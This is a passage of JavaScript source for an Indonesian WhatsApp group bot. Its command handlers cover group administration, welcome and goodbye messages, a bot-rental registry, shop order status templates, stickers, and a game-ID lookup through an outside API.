case 'setnamegc':
case 'setsubject': {
           if (!m.isGroup) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝗀𝗋𝗈𝗎𝗉')
                if (!isAdmins) return m.reply('🤖 : 𝖿𝗂𝗍𝗎𝗋 𝗄𝗁𝗎𝗌𝗎𝗌 𝖺𝖽𝗆𝗂𝗇')
                if (!isBotAdmins) return m.reply("🤖 : 𝗃𝖺𝖽𝗂𝗄𝖺𝗇 𝖺𝗄𝗎 𝗌𝖾𝖻𝖺𝗀𝖺𝗂 𝖺𝖽𝗆𝗂𝗇")
            if (!text) return reply(`> ontoh ${prefix+command} bot WhatsApp`)
            await AnanthaGanz.groupUpdateSubject(m.chat, text).then((res) => reply("🤖 : Done")).catch((err) => reply("Terjadi kesalahan"))
         }
         break
case 'bot':{
            var bot = `Ada yang bisa ${namabot} bantu?`
            const getTextB = getTextSetBot((m.isGroup? m.chat: botNumber), set_bot);
            if (getTextB !== undefined) {
                var pull_pesan = (getTextB.replace('@bot', namabot).replace('@owner', namaowner).replace('@jam', time).replace('@tanggal', tanggal(new Date())))
                AnanthaGanz.sendMessage(m.chat, { text: `${pull_pesan}` }, { quoted: m })
            } else {
                AnanthaGanz.sendMessage(m.chat, { text: bot }, { quoted: m })
            }
}
            break
case "updatesetbot": case 'setbot': case 'changebot':{
            if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin & owner!')
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_bot*\n\n_Contoh_\n\n${command} Halo saya adalah @bot\n\n@bot = nama bot\n@owner = nama owner\n@jam = jam\n@tanggal = tanggal`)
            if (isSetBot((m.isGroup? m.chat: botNumber), set_bot)) {
                changeSetBot(q, (m.isGroup? m.chat: botNumber), set_bot)
                reply(`Sukses update set bot teks!`)
            } else {
                addSetBot(q, (m.isGroup? m.chat: botNumber), set_bot)
                reply(`Sukses set teks bot!`)
            }
        }
            break
case 'delsetbot':{
            if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin & owner!')
            if (!isSetBot((m.isGroup? m.chat: botNumber), set_bot)) return reply(`Belum ada set bot di chat ini`)
            removeSetBot((m.isGroup? m.chat: botNumber), set_bot)
            reply(`Sukses delete set bot`)
        }
            break
case 'updatelist': case 'update':{
        // if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin & owner!')
            var args1 = q.split("|")[0].toLowerCase()
            var args2 = q.split("|")[1]
            if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${command} *key|response*\n\n_Contoh_\n\n${command} tes|apa`)
            if (!isAlreadyResponList((m.isGroup? m.chat: botNumber), args1, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di chat ini`)
            if (/image/.test(mime)) {
                let media = await AnanthaGanz.exdownloadAndSaveMediaMessage(quoted)
                let mem = await TelegraPh(media)
                        updateResponList((m.isGroup? m.chat: botNumber), args1, args2, true, mem, db_respon_list)
                        reply(`Sukses update respon list dengan key *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
            } else {
                updateResponList((m.isGroup? m.chat: botNumber), args1, args2, false, '-', db_respon_list)
                reply(`Sukses update respon list dengan key *${args1}*`)
            }
            }
            break            
case 'jeda': {
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!isAdmins) return m.reply('Fitur Khusus admin!')
            if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin terlebih dahulu")
            if (!text) return m.reply(`kirim ${command} waktu\nContoh: ${command} 30m\n\nlist waktu:\ns = detik\nm = menit\nh = jam\nd = hari`)
            opengc[m.chat] = { id: m.chat, time: Date.now() + toMs(text) }
            fs.writeFileSync('./database/opengc.json', JSON.stringify(opengc))
            AnanthaGanz.groupSettingUpdate(m.chat, "announcement")
            .then((res) => reply(`Sukses, group akan dibuka ${text} lagi`))
            .catch((err) => reply('Error'))
            }
            break
case 'tambah':{
    if (!text.includes('+')) return m.reply(`Gunakan dengan cara ${command} *angka* + *angka*\n\n_Contoh_\n\n${command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one + nilai_two}`)}
            break
case 'kurang':{
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
            if (!text.includes('-')) return m.reply(`Gunakan dengan cara ${command} *angka* - *angka*\n\n_Contoh_\n\n${command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one - nilai_two}`)}
            break
case 'kali':{
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
            if (!text.includes('*')) return m.reply(`Gunakan dengan cara ${command} *angka* * *angka*\n\n_Contoh_\n\n${command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one * nilai_two}`)}
            break
case 'bagi':{
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
            if (!text.includes('/')) return m.reply(`Gunakan dengan cara ${command} *angka* / *angka*\n\n_Contoh_\n\n${command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one / nilai_two}`)}
            break
case 'setproses': case 'setp':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur khusus admin*')
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
            if (isSetProses((m.isGroup? m.chat: botNumber), set_proses)) return m.reply(`*Setproses already active*`)
            addSetProses(text, (m.isGroup? m.chat: botNumber), set_proses)
            reply(`*Sukses setproses*`)
        }
            break
case 'changeproses': case 'changep':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
            if (isSetProses((m.isGroup? m.chat: botNumber), set_proses)) {
                changeSetProses(text, (m.isGroup? m.chat: botNumber), set_proses)
                m.reply(`*Sukses merubah set proses*`)
            } else {
                addSetProses(text, (m.isGroup? m.chat: botNumber), set_proses)
                m.reply(`*Sukses merubah setproses*`)
            }
        }
            break
case 'delsetproses': case 'delsetp':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!isSetProses((m.isGroup? m.chat: botNumber), set_proses)) return m.reply(`Belum ada set proses di gc ini`)
            removeSetProses((m.isGroup? m.chat: botNumber), set_proses)
            reply(`*Sukses delete setproses*`)
        }
            break
case 'setdone':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur khusus admin*')
            if (!text) return m.reply(`*CARA PENGGUNAAN FITUR SETDONE*\n\nContoh :\n${prefix + command} pesanan @user sudah done\n\nAlat Bantu :\n• @jam (waktu pemesanan)\n• @user (untuk tag orangnya)\n• @pesanan (isi pesan buyer)\n• @tanggal (tanggal pemesanan)`)
            if (isSetDone((m.isGroup? m.chat: botNumber), set_done)) return m.reply(`*Delsetdone dulu*`)
            addSetDone(text, (m.isGroup? m.chat: botNumber), set_done)
            reply(`*Sukses setdone*`)
            break
            }
case 'changedone': case 'changed':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
            if (isSetDone((m.isGroup? m.chat: botNumber), set_done)) {
                changeSetDone(text, (m.isGroup? m.chat: botNumber), set_done)
                m.reply(`*Sukses merubah setdone*`)
            } else {
                addSetDone(text, (m.isGroup? m.chat: botNumber), set_done)
                m.reply(`*Sukses merubah setdone*`)
            }
           }
            break
case 'delsetdone': case 'delsetd':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur khusus admin*')
            if (!isSetDone((m.isGroup? m.chat: botNumber), set_done)) return m.reply(`Belum ada set done di gc ini`)
            removeSetDone((m.isGroup? m.chat: botNumber), set_done)
            m.reply(`*Sukses delete setdone*`)
        }
            break
case"p": case"proses":{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur Khusus admin*')
            if (!m.quoted) return m.reply('*Reply pesanan yang akan proses*')
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`
            const getTextP = getTextSetProses((m.isGroup? m.chat: botNumber), set_proses);
            if (getTextP !== undefined) {
                var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
                AnanthaGanz.sendTextWithMentions(m.chat, anunya, m)
            } else {
   AnanthaGanz.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
            }
            }
            break
case "d": case'done':{
        if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*Fitur khusus admin*')
            if (!m.quoted) return m.reply('*Reply pesanan yang telah di proses*')
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`            
            const getTextD = getTextSetDone((m.isGroup? m.chat: botNumber), set_done);
            if (getTextD !== undefined) {
                var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
                AnanthaGanz.sendTextWithMentions(m.chat, anunya, m)
               } else {
                AnanthaGanz.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
               }
   }
   break
case'welcome':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!isAdmins) return m.reply('Fitur Khusus admin!')
            if (args[0] === "on") {
               if (isWelcome) return m.reply(`Udah on`)
                _welcome.push(m.chat)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
                reply('Sukses mengaktifkan welcome di grup ini')
            } else if (args[0] === "off") {
               if (!isWelcome) return m.reply(`Udah off`)
                let anu = _welcome.indexOf(m.chat)
               _welcome.splice(anu, 1)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
                reply('Sukses menonaktifkan welcome di grup ini')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
            }
            break
case'left': case 'goodbye':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!isAdmins) return m.reply('Fitur Khusus admin!')
            if (args[0] === "on") {
               if (isLeft) return m.reply(`Udah on`)
                _left.push(m.chat)
                fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
                reply('Sukses mengaktifkan goodbye di grup ini')
            } else if (args[0] === "off") {
               if (!isLeft) return m.reply(`Udah off`)
                let anu = _left.indexOf(m.chat)
               _left.splice(anu, 1)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
                reply('Sukses menonaktifkan goodbye di grup ini')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
        }
            break
case'setwelcome':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!text) return m.reply(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @user, Selamat datang di @group`)
            if (isSetWelcome(m.chat, set_welcome_db)) return m.reply(`Set welcome already active`)
            addSetWelcome(text, m.chat, set_welcome_db)
           reply(`Successfully set welcome!`)
            }
            break
case'changewelcome':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!text) return m.reply(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @user, Selamat datang di @group`)
            if (isSetWelcome(m.chat, set_welcome_db)) {
               changeSetWelcome(q, m.chat, set_welcome_db)
                reply(`Sukses change set welcome teks!`)
            } else {
              addSetWelcome(q, m.chat, set_welcome_db)
                reply(`Sukses change set welcome teks!`)
            }}
            break
case'delsetwelcome':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!isSetWelcome(m.chat, set_welcome_db)) return m.reply(`Belum ada set welcome di sini..`)
            removeSetWelcome(m.chat, set_welcome_db)
           reply(`Sukses delete set welcome`)
        }
            break
case 'setleft': {
         
            if (!m.isGroup) return m.reply('Fitur Khusus Group!');
            if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!');

            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`);

            if (isSetLeft(m.chat, set_left_db)) return m.reply(`Set left already active`);

            addSetLeft(text, m.chat, set_left_db);
            m.reply(`Successfully set left!`);
        }
            break
case'changeleft':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
            if (isSetLeft(m.chat, set_left_db)) {
               changeSetLeft(q, m.chat, set_left_db)
                reply(`Sukses change set left teks!`)
            } else {
                addSetLeft(q, m.chat, set_left_db)
                reply(`Sukses change set left teks!`)
            }
        }
            break
case'delsetleft':{
       
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
            if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!isSetLeft(m.chat, set_left_db)) return m.reply(`Belum ada set left di sini..`)
            removeSetLeft(m.chat, set_left_db)
            reply(`Sukses delete set left`)
        }
            break
case'antiwame': case 'aw1': {
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
                if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin terlebih dahulu")
             if (args[0] === "on") {
                if (isAntiWame) return m.reply(`Udah aktif`)
                antiwame.push(m.chat)
                fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
                reply('Successfully Activate Antiwame In This Group')
            } else if (args[0] === "off") {
                if (!isAntiWame) return m.reply(`Udah nonaktif`)
                let anu = antiwame.indexOf(m.chat)
                antiwame.splice(anu, 1)
                fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
                reply('Successfully Disabling Antiwame In This Group')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
}
            break
case'antiwame2': case 'aw2': {
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
                if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin terlebih dahulu")
             if (args[0] === "on") {
                if (isAntiWame2) return m.reply(`Udah aktif`)
                antiwame2.push(m.chat)
                fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
                reply('Successfully Activate antiwame2 In This Group')
            } else if (args[0] === "off") {
                if (!isAntiWame2) return m.reply(`Udah nonaktif`)
                let anu = antiwame2.indexOf(m.chat)
                antiwame2.splice(anu, 1)
                fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
                reply('Successfully Disabling antiwame2 In This Group')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
}
            break
case'addsewa':{
            if (!isCreator) return m.reply("> fitur khusus owner")
            if (text < 2) return m.reply(`Gunakan dengan cara ${prefix + command} *linkgc waktu*\n\nContoh : ${command} https://chat.whatsapp.com/JanPql7MaMLa 30d\n\n*CATATAN:*\n> d = hari (day)\n> m = menit(minute)\n> s = detik (second)\n> y = tahun (year)\n> h = jam (hour)`)
            if (!isUrl(args[0])) return m.reply("*Matikan fitur _Setujui Anggota Baru_ di izin group*")
            var url = args[0]
            url = url.split('https://chat.whatsapp.com/')[1]
            if (!args[1]) return m.reply(`*Tidak ada durasi*`)
            var data = await AnanthaGanz.groupAcceptInvite(url)
            if(checkSewaGroup(data, sewa)) return m.reply(`*Bot sudah disewa oleh grup tersebut*`)
            addSewaGroup(data, args[1], sewa)
            reply(`*Berhasil menambah durasi sewa*`)
           }
            break
case'delsewa':{
            if (!isCreator) return m.reply("*Fitur khusus owner !*")
            if (!m.isGroup) return m.reply(`*Perintah ini hanya bisa dilakukan di group yang menyewa bot*`)
            if (!isSewa) return m.reply(`*Bot tidak disewa di group ini*`)
            sewa.splice(getSewaPosition(m.chat, sewa), 1)
            fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
            reply(`*Sukses menghapus durasi sewa*`)
            }
            break
case 'ceksewa': {
    const targetId = m.chat; // Asumsikan ID grup yang sedang dicek adalah ID obrolan saat ini
    let penyewa = sewa.find(x => x.id === targetId);
                if (!m.isGroup) return m.reply('Fitur Khusus Group!')
    if (penyewa) {
        let list_sewa_list = `*DETAIL DURASI SEWA*\n`;
        list_sewa_list += `> ${await getGcName(penyewa.id)}\n> ${penyewa.id}\n`;
        
        if (penyewa.expired === 'PERMANENT') {
            list_sewa_list += `> *expire :* PERMANENT\n\n`;
        } else {
            let ceksewa = penyewa.expired - Date.now();
            list_sewa_list += `> ${msToDate(ceksewa)}`;
        }

        AnanthaGanz.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m });
    } else {
        AnanthaGanz.sendMessage(m.chat, { text: 'ID grup tidak ditemukan dalam daftar penyewa.' }, { quoted: m });
    }
    break;
                }
case 'listsewa':{
if(!isCreator) return
            let list_sewa_list = `*TOTAL PENYEWA:* ${sewa.length}\n\n`
            let data_array = [];
            for (let x of sewa) {
                list_sewa_list += `> ${await getGcName(x.id)}\n> *ID :* ${x.id}\n`
                if (x.expired === 'PERMANENT') {
                    let ceksewa = 'PERMANENT'
                    list_sewa_list += `> *expire :* PERMANENT\n\n`
                } else {
                    let ceksewa = x.expired - Date.now()
                    list_sewa_list += `> *expired :* ${msToDate(ceksewa)}\n\n`
                }
            }
            AnanthaGanz.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
        }
            break
    
case 'open': case 'buka': {
    if (!m.isGroup) return m.reply('*Fitur khusus group !*');
    if (!isAdmins) return m.reply('*Fitur khusus admin !*');
    if (!isBotAdmins) return m.reply("*Fitur khusus admin !*");
let time = new Date().toLocaleTimeString('id-ID', { 
    hour: '2-digit', 
    minute: '2-digit', 
    timeZone: 'Asia/Jakarta' // Zona waktu WIB (UTC+7)
});
    //let time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }); // Jam
    let tanggal = new Date().toLocaleDateString('id-ID'); // Tanggal
    
    // Template default untuk pesan sukses membuka group
    let suksesOpen = `*Sukses membuka group*\n\n📅 Tanggal : @tanggal\n⏰ Jam : @jam\n👤 Dibuka oleh : @user`;
AnanthaGanz.groupSettingUpdate(m.chat, 'not_announcement')
    const textOpen = await getTextSetOpen(m.chat, set_open);
    
    if (textOpen !== undefined) {
        // Ganti placeholder dalam template dengan nilai aktual
        var pesanOpen = textOpen
            .replace('@jam', time)
            .replace('@tanggal', tanggal)
            .replace('@user', '@' + m.sender.split("@")[0]);
        
        AnanthaGanz.sendMessage(m.chat, {text: pesanOpen, mentions: [m.sender]})
        /*
        reply(pesanOpen, {
              mentions: [m.sender]
            });
            */
        // reply(pesanOpen);
    } else {
        // Jika tidak ada custom template, gunakan template default
        let defaultOpenMessage = suksesOpen
            .replace('@jam', time)
            .replace('@tanggal', tanggal)
            .replace('@user', '@' + m.sender.split("@")[0]);
        
        AnanthaGanz.sendMessage(m.chat, {text: defaultOpenMessage, mentions: [m.sender]})
       // reply(defaultOpenMessage ,{mentions: [m.sender]});
    }
                   // AnanthaGanz.groupSettingUpdate(m.chat, 'not_announcement')
}
break;
case'antilink': case 'al1': {
            if (!m.isGroup) return m.reply('*Fitur khusus group !*')
                if (!isAdmins) return m.reply('*Fitur khusus admin !*')
                if (!isBotAdmins) return m.reply("*Fitur khusus admin !*")
            if (args[0] === "on") {
               if (isAntiLink) return m.reply(`*Aktif*`)
                antilink.push(m.chat)
                fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                reply('*Sukses menyalakan fitur antilink*')
            } else if (args[0] === "off") {
               if (!isAntiLink) return m.reply(`*Nonaktif*`)
                let anu = antilink.indexOf(m.chat)
                antilink.splice(anu, 1)
                fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                reply('*Sukses mematikan fitur antilink*')
            } else {
                reply(`*CARA PENGGUNAAN FITUR ANTILINK*\n\nKirim pesan _${prefix + command} on/off_ ke group yang sudah menyewa bot`)
            }
  
}
            break
case'antilink2' : case 'al2' :{
            if (!m.isGroup) return m.reply('*Fitur khusus group !*')
                if (!isAdmins) return m.reply('*Fitur khusus admin !*')
                if (!isBotAdmins) return m.reply("*Fitur khusus admin !*")
            if (args[0] === "on") {
               if (isAntiLink2) return m.reply(`*Aktif*`)
                antilink2.push(m.chat)
                fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
                reply('*Sukses menyalakan fitur antilink2*')
            } else if (args[0] === "off") {
               if (!isAntiLink2) return m.reply(`*Nonaktif*`)
                let anu = antilink2.indexOf(m.chat)
                antilink2.splice(anu, 1)
                fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
                reply('*Sukses mematikan fitur antilink2*')
            } else {
                reply(`*CARA PENGGUNAAN FITUR ANTILINK2*\n\nKirim pesan _${prefix + command} on/off_ ke group yang sudah menyewa bot`)
            }
  
}
            break         
case 'close': case 'tutup': {
    if (!m.isGroup) return m.reply('*Fitur khusus group !*');
    if (!isAdmins) return m.reply('*Fitur khusus admin !*');
    if (!isBotAdmins) return m.reply("*Fitur khusus admin !*");
let time = new Date().toLocaleTimeString('id-ID', { 
    hour: '2-digit', 
    minute: '2-digit', 
    timeZone: 'Asia/Jakarta' // Zona waktu WIB (UTC+7)
});
    //let time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }); // Jam
    let tanggal = new Date().toLocaleDateString('id-ID'); // Tanggal
    
    // Template default untuk pesan sukses menutup group
    let suksesClose = `*Sukses menutup group*\n\n📅 Tanggal : @tanggal\n⏰ Jam : @jam\n👤 Ditutup oleh : @user`;

    AnanthaGanz.groupSettingUpdate(m.chat, 'announcement');

    const textClose = await getTextSetClose(m.chat, set_close);
    
    if (textClose !== undefined) {
        // Ganti placeholder dalam template dengan nilai aktual
        var pesanClose = textClose
            .replace('@jam', time)
            .replace('@tanggal', tanggal)
            .replace('@user', '@' + m.sender.split("@")[0]);
        
        AnanthaGanz.sendMessage(m.chat, {text: pesanClose, mentions: [m.sender]})
        // reply(pesanClose);
    } else {
        // Jika tidak ada custom template, gunakan template default
        let defaultCloseMessage = suksesClose
            .replace('@jam', time)
            .replace('@tanggal', tanggal)
            .replace('@user', '@' + m.sender.split("@")[0]);
        
         AnanthaGanz.sendMessage(m.chat, {text: defaultCloseMessage, mentions: [m.sender]})
        // reply(defaultCloseMessage);
    }
             //       AnanthaGanz.groupSettingUpdate(m.chat, 'announcement')
}
break;           
case 'h':
case 'hidetag': {
    if (!m.isGroup) return reply("*Khusus group !*");
    if (!(isAdmins || isCreator)) return reply("*Fitur khusus admin !*");

    // Check if there's a quoted message or image
    let tek = m.quoted ? quoted.text : (text ? text : "");
    let media = m.quoted ? m.quoted : null; // Get the quoted message

    // Check if the quoted message is an image
    if (/image/.test(mime)) {
        // Handle the image
        let imageUrl = await AnanthaGanz.downloadAndSaveMediaMessage(quoted); // Download the image
        // Send the image with mentions
        AnanthaGanz.sendMessage(m.chat, {
            image: { url: imageUrl }, // Use the downloaded image
            caption: tek, // Caption can be the text or empty
            mentions: participants.map(a => a.id)
        });
    } else {
        // Handle text if no image is detected
        AnanthaGanz.sendMessage(m.chat, {
            text: tek,
            mentions: participants.map(a => a.id)
        });
    }
}
break;
case 'sgif':
case 'stikerin':
case 'sticker':
case 'stiker': {
           if (!quoted) return reply(`*CARA PENGGUNAAN FITUR STIKER*\n\nReply atau geser ke kanan foto atau video dengan pesan ${prefix + command}, Maksimal durasi untuk video 9 detik`)
            if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await AnanthaGanz.sendImageAsSticker(m.chat, media, m, {
                  packname: global.namabot,
                  author: global.namaowner
               })
               await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return reply(`*CARA PENGGUNAAN FITUR STIKER*\n\nReply atau geser ke kanan foto atau video dengan pesan ${prefix + command}, Maksimal durasi untuk video 9 detik`)
               let media = await quoted.download()
               let encmedia = await AnanthaGanz.sendVideoAsSticker(m.chat, media, m, {
                  packname: global.namabot,
                  author: global.namaowner
               })
               await fs.unlinkSync(encmedia)
            } else {
               reply(`*CARA PENGGUNAAN FITUR STIKER*\n\nReply atau geser ke kanan foto atau video dengan pesan ${prefix + command}, Maksimal durasi untuk video 9 detik`)
            }
 
         }
         break
case 'emojimix': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
   if (!q) return reply(`*CARA PENGGUNAAN FITUR EMOJIMIX*\n\nKirim perintah:\n${prefix + command} 🥺+🤣`)

   let [emot1, emot2] = q.split('+')
   if (!emot1 || !emot2) return reply(`Masukkan dua emoji dipisah dengan tanda +\nContoh: ${prefix + command} 🥺+🤣`)

   try {
     let res = await fetch(`https://cekid.zannstore.com/v2/emojimix?api_req=idsAPITOLS&emot_1=${encodeURIComponent(emot1)}&emot_2=${encodeURIComponent(emot2)}`)
     let json = await res.json()
     if (json.status != 'success') return reply(`Gagal mendapatkan kombinasi emoji`)

     let image = await getBuffer(json.data.url)
     let encmedia = await AnanthaGanz.sendImageAsSticker(m.chat, image, m, {
       packname: global.namabot,
       author: global.namaowner
     })
     

   } catch (e) {
     console.log(e)
     reply(`Terjadi kesalahan, coba lagi nanti`)
   }
}
break
case 'kick': case 'k': {
                if (!m.isGroup) return m.reply('*Fitur khusus group !*')
                if (!isAdmins) return m.reply('*Fitur khusus admin !*')
                if (!isBotAdmins) return m.reply('*Fitur khusus admin !*')
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
        await AnanthaGanz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply('Uppssss, Sorry Ke Kick wkwkwk')).catch((err) => m.reply('*Waduh... Terjadi kesalahan*'))
    }
    break
case 'add': {
        if (!m.isGroup) return m.reply('*Fitur khusus group !*')
                if (!isAdmins) return m.reply('*Fitur khusus admin !*')
                if (!isBotAdmins) return m.reply('*Fitur khusus admin !*')
        let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
        await AnanthaGanz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply('sukses menambahkan anggota')).catch((err) => m.reply('*Waduh... Terjadi kesalahan mungkin nomornya private*'))
    }
    break
case 'ping':{
 m.reply(runtime(process.uptime()))
}
break
case 'sewa': {
                reply(`*chat owner aja ya kak*`)
            }
                break
// START TOLS CEK NICK //
case 'cekff': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const id = args[0];
  if (!id) {
    return reply(`*GAME : FREE FIRE*\n\nMasukkan ID dengan benar.\nContoh:\n*.cekff* 7194234362`);
  }

  try {
    const axios = require('axios');
    const res = await axios.get(`https://cekid.zannstore.com/v2/free-fire?api_req=idsAPITOLS&user_id=${id}`);
    const data = res.data;

    if (data.status === 'success') {
      let nickname = data.data.nickname || 'Tidak ditemukan';
      let negara = data.data.country || 'Tidak diketahui';
      reply(`*FREE FIRE*\n\n• *Nickname:* ${nickname}\n• *Negara:* ${negara}`);
    } else {
      reply(data.msg || 'Gagal mengambil data.');
    }

  } catch (e) {
    console.log(e);
    reply('Terjadi kesalahan saat memproses permintaan.');
  }
  break;
}
 
case 'undawn': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const nomor = text.trim();
